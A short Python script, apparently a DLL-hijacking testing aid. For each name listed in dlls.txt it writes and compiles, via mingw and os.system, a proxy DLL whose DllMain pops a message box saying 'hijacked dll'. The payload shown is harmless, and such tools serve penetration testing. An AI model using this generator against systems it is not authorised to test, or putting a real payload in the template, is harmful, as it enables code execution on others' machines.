import os
template = """
// Tested in Win10
// x86_64-w64-mingw32-g++ dllmsgbox.c -o WINSTA.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            MessageBox(0,"dllname_replace", "1", MB_OK);
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
"""
with open("dlls.txt", "r") as dll_list:
    for dll_name in dll_list.readlines():
        print(dll_name.strip())
        file_name = dll_name.strip().replace(".dll", ".cpp").replace(".DLL", ".cpp")
        with open(file_name, "w") as cpp_file:
            cpp_file.write(template.replace("dllname_replace", f"hijacked dll: {file_name.replace('.cpp', '.dll')}"))
        os.system(f"x86_64-w64-mingw32-g++ {file_name} -o {file_name.replace('.cpp', '.dll')} -shared")